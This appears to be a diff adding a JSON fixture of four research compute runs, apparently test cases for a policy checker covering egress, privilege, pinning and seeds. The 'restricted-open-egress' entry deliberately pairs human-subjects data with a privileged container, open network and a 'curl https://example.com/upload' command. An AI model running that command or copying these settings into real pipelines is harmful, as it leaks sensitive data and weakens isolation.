@@ -1,0 +1,183 @@
+[
+  {
+    "runId": "safe-notebook-deny-egress",
+    "title": "Pinned notebook rerun with restricted clinical table",
+    "inputs": [
+      {
+        "id": "clinical-table-v3",
+        "dataClass": "controlled_access",
+        "access": "private",
+        "version": "2026.05.12"
+      }
+    ],
+    "runtime": {
+      "image": "registry.scibase.local/repro-python@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "privileged": false,
+      "allowPrivilegeEscalation": false,
+      "capabilities": [],
+      "mounts": [
+        {
+          "type": "artifact",
+          "path": "/inputs/clinical-table-v3",
+          "mode": "readOnly"
+        }
+      ]
+    },
+    "network": {
+      "mode": "deny"
+    },
+    "resources": {
+      "cpuCores": 4,
+      "memoryMb": 8192,
+      "timeoutMinutes": 45
+    },
+    "commands": [
+      "python analysis/run.py --seed 1701"
+    ],
+    "outputs": [
+      {
+        "path": "outputs/model-metrics.json",
+        "mediaType": "application/json",
+        "checksum": "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "access": "private"
+      }
+    ],
+    "reproducibility": {
+      "seed": "1701"
+    }
+  },
+  {
+    "runId": "restricted-open-egress",
+    "title": "Unpinned privileged run with public output",
+    "inputs": [
+      {
+        "id": "single-cell-private",
+        "dataClass": "restricted_human_subjects",
+        "access": "private"
+      }
+    ],
+    "runtime": {
+      "image": "python:latest",
+      "privileged": true,
+      "allowPrivilegeEscalation": true,
+      "capabilities": ["SYS_ADMIN"],
+      "mounts": [
+        {
+          "type": "hostPath",
+          "path": "C:/research/raw",
+          "mode": "readWrite"
+        }
+      ]
+    },
+    "network": {
+      "mode": "open"
+    },
+    "resources": {
+      "cpuCores": 16,
+      "memoryMb": 131072,
+      "timeoutMinutes": 480
+    },
+    "commands": [
+      "python train.py && curl https://example.com/upload"
+    ],
+    "outputs": [
+      {
+        "path": "public/results.csv",
+        "mediaType": "text/csv",
+        "checksum": "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+        "access": "public"
+      }
+    ]
+  },
+  {
+    "runId": "scheduled-rerun-needs-seed",
+    "title": "Scheduled public benchmark missing reproducibility seed",
+    "inputs": [
+      {
+        "id": "public-weather-benchmark",
+        "dataClass": "public",
+        "access": "public"
+      }
+    ],
+    "runtime": {
+      "imageDigest": "sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+      "privileged": false,
+      "allowPrivilegeEscalation": false,
+      "capabilities": [],
+      "mounts": []
+    },
+    "network": {
+      "mode": "deny"
+    },
+    "resources": {
+      "cpuCores": 2,
+      "memoryMb": 4096,
+      "timeoutMinutes": 30
+    },
+    "commands": [
+      "python reproduce.py"
+    ],
+    "outputs": [
+      {
+        "path": "outputs/forecast-summary.json",
+        "mediaType": "application/json",
+        "checksum": "sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+        "access": "public"
+      }
+    ],
+    "schedule": {
+      "enabled": true,
+      "cron": "0 5 * * 1"
+    },
+    "reproducibility": {}
+  },
+  {
+    "runId": "restricted-allowlist-review",
+    "title": "Restricted DOI enrichment needs egress reviewer approval",
+    "inputs": [
+      {
+        "id": "embargoed-proteomics",
+        "dataClass": "embargoed",
+        "access": "internal",
+        "version": "v2.1"
+      }
+    ],
+    "runtime": {
+      "image": "registry.scibase.local/proteomics@sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+      "privileged": false,
+      "allowPrivilegeEscalation": false,
+      "capabilities": [],
+      "mounts": [
+        {
+          "type": "artifact",
+          "path": "/inputs/proteomics",
+          "mode": "readOnly"
+        }
+      ]
+    },
+    "network": {
+      "mode": "allowlist",
+      "allowlist": ["doi.org", "api.datacite.org"],
+      "reviewerApproved": false
+    },
+    "resources": {
+      "cpuCores": 2,
+      "memoryMb": 6144,
+      "timeoutMinutes": 25
+    },
+    "commands": [
+      "node enrich-doi.js"
+    ],
+    "outputs": [
+      {
+        "path": "outputs/datacite-metadata.json",
+        "mediaType": "application/json",
+        "checksum": "sha256:9999999999999999999999999999999999999999999999999999999999999999",
+        "access": "private"
+      }
+    ],
+    "reproducibility": {
+      "seed": "doi-enrichment-1"
+    }
+  }
+]
